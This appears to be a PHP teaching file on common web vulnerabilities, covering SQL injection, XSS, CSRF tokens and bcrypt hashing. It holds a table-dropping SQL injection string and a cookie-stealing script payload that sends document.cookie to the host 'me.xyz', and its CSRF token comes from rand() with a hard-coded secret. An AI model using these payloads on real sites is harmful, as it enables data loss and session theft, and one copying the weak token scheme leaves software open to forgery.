<?php


/* ------------- No System is Safe ------------- */

// https://owasp.org/www-project-top-ten/


// 1. SQL Injection
$id = $_GET['id'];
// $sql = "SELECT * FROM users WHERE id = $id";
$sql = "SELECT * FROM users WHERE id = 1;drop table users";

// get.php?id=1;drop table users  / URL

// 2. XSS - Cross Site Scripting

// echo htmlspecialchars("<script>location.href='http://me.xyz?c='+document.cookie</script>");

// echo "<script>alert(1)</script>";

$title = htmlspecialchars($_POST['title']);
$description = htmlspecialchars($_POST['description']);

// <script>location.href='http://me.xyz?c='+document.cookie</script>

// echo htmlspecialchars($comment);


// 3. CSRF - Cross Site Request Forgery

// echo sha1(rand(1, 1000) . time());

session_start();

$token = sha1(rand(1, 1000) . 'csrf secret');
$_SESSION['csrf'] = $token;
?>

<a href="delete.php?id=1&csrf=<?= $token?>">Delete</a>

<!-- 4. Hashing -->
<?php
$password = "userpassword";
$hash = password_hash($password, PASSWORD_BCRYPT);

echo $hash;

?>